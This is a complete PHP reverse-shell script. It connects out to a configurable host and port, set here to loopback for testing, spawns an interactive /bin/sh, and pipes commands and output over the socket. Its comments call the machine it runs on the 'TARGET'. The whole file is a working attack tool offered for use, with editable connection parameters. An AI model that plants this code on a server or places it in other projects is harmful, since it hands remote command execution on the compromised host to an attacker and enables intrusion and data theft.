<?php

    // CHANGE THE FOLLOWING PARAMS AS NEEDED:
    //---------------------------------------------------------------
    $host = '127.0.0.1';   # shell destination (loopback for testing)
    $port = 5555;          # shell destination port
    $timeout = 20.0;       # connection timeout time (seconds):
    $shell = '/bin/sh -i'; # shell to run
    //---------------------------------------------------------------


    // open a socket to connect to host
    $socket = fsockopen($host, $port, $errno, $errstr, $timeout);
    
    // check if connection successfull
    if (!$socket) 
    {
        exit("UNABLE TO CONNECT TO HOST\n");
    }

    // notify host
    fwrite($socket, "CONNECTION ESTABLISHED\n");


    // process pipes
    $descriptorspec = array 
    (
        0 => array( "pipe", "r" ),  #stdin
        1 => array( "pipe", "w" ),  #stdout
        2 => array( "pipe", "w" )   #sterr
    );

    // get a shell
    $process = proc_open($shell, $descriptorspec, $pipes);

    // make sure we have a shell
    if ( !is_resource($process) )
    {
        fwrite($socket, "FAILED TO SPAWN A SHELL ON TARGET\n");
        exit("FAILED TO SPAWN SHELL\n");
    }

    //notify host
    fwrite($socket, "SHELL SPAWNED SUCCESSFULLY\n");


    //set data streams to non-blocking so they
    //don't wait for data when being read
    stream_set_blocking($socket  , FALSE);
    stream_set_blocking($pipes[0], FALSE);
    stream_set_blocking($pipes[1], FALSE);
    stream_set_blocking($pipes[2], FALSE);

    // now we've got a reverse shell.
    // handle io:
    while (TRUE) 
    {

        // check our connection to the host:
        // we've lost our shell if we've 
        // reached EOF on the socket or
        // or stdout pointers
        if ( feof($socket) || feof($pipes[1]) ) 
        {
            break;
        }

        // keeps track of the state of stdin, stdout, and stderr
        $traffic = array($socket, $pipes[1], $pipes[2]);
        // dumby variables because we only care aboout traffic
        $write = null; $except = null;
        // wait for traffic
        $changedStreams = stream_select($traffic,$write,$except,null);


        // incoming commands from host:
        if ( in_array($socket, $traffic) )
        {
            // get incomming command and send to stdin
            $command = fread($socket, 1500);
            fwrite($pipes[0], $command);
        }


        // outgoing messages from stdout
        if ( in_array($pipes[1], $traffic) )
        {
            // get outgoing message and send to host
            $message = fread($pipes[1], 1500);
            fwrite ($socket, $message);
        }


        // outgoing messages from stderr
        if ( in_array($pipes[2], $traffic) )
        {
            // get outgoing message and send to host
            $message = fread($pipes[2], 1500);
            fwrite ($socket, $message);
        }

    }

    //clean up nice
    proc_close($process);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    fclose($socket);

?>